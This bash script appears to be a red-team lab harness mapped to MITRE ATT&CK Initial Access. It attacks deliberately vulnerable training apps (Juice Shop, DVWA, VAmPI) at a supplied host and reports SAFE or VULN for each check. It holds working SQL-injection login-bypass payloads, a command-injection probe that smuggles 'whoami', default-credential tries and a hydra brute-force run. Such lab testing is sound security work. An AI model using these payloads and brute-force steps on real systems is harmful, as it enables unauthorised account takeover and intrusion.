#!/bin/bash
# MITRE ATT&CK: Initial Access (TA0001)
# Techniques: T1190 Exploit Public-Facing App, T1078 Valid Accounts,
#             T1133 External Remote Services
# Tools: sqlmap, hydra, curl
set -uo pipefail

TARGET="${1:?Usage: 02-initial-access.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] MITRE ATT&CK TA0001: Initial Access against ${TARGET}"
echo ""

echo "=== T1190: Exploit Public-Facing Application ==="
echo "    Technique: SQL injection to bypass authentication"

echo "  [T1190.a] Juice Shop admin login bypass (SQLi):"
for payload in "admin'--" "' OR 1=1--" "admin'/*" "') OR ('1'='1"; do
  code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${payload}\",\"password\":\"x\"}" --max-time 10) || code="ERR"
  tag="[SAFE]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s SQLi login bypass (%s) -> HTTP %s\n" "$tag" "$payload" "$code"
done
echo ""

echo "  [T1190.b] DVWA command injection:"
code=$(curl -sf -o /dev/null -w "%{http_code}" "${BASE}/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bwhoami&Submit=Submit" --max-time 10) || code="ERR"
echo "  Command injection probe -> HTTP ${code}"
echo ""

echo "=== T1078: Valid Accounts ==="
echo "    Technique: Default credential testing"

echo "  [T1078.a] DVWA default creds (admin/password):"
login_resp=$(curl -sf -c /tmp/mitre-cookies-$$.txt "${BASE}/dvwa/login.php" --max-time 10)
token=$(echo "$login_resp" | grep -oP "user_token.*?value='\K[^']+" || echo "")
if [[ -n "$token" ]]; then
  result=$(curl -sf -b /tmp/mitre-cookies-$$.txt -o /dev/null -w "%{http_code}" \
    -d "username=admin&password=password&Login=Login&user_token=${token}" \
    "${BASE}/dvwa/login.php" --max-time 10) || result="ERR"
  [[ "$result" == "302" ]] && echo "  [VULN] Default credentials WORK (admin/password)" || echo "  [SAFE] Default credentials rejected ($result)"
else
  echo "  [INFO] Could not extract CSRF token from login page"
fi

echo ""
echo "  [T1078.b] Juice Shop known accounts:"
for cred in "admin@example.com:admin123" "jim@example.com:ncc-1701" "bender@example.com:OhG0dPlease1nsique"; do
  user="${cred%%:*}"
  pass="${cred##*:}"
  code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
    -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${pass}\"}" --max-time 10) || code="ERR"
  tag="[SAFE]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s %s:%s -> HTTP %s\n" "$tag" "$user" "$pass" "$code"
done

echo ""
echo "  [T1078.c] VAmPI default/weak accounts:"
for cred in "admin:admin" "admin:password" "admin:123456" "test:test"; do
  user="${cred%%:*}"
  pass="${cred##*:}"
  code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/vampi/users/v1/login" \
    -H "Content-Type: application/json" -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" --max-time 10) || code="ERR"
  tag="[SAFE]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s %s:%s -> HTTP %s\n" "$tag" "$user" "$pass" "$code"
done

echo ""
echo "=== T1078.004: Valid Accounts — Cloud Accounts ==="
echo "    Technique: Brute force via Hydra"
echo "  [T1078.d] Hydra brute force against DVWA:"
hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
  -s 80 "$TARGET" http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect" \
  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:)" | head -5
echo ""

rm -f /tmp/mitre-cookies-$$.txt
echo "[*] TA0001 Initial Access complete"
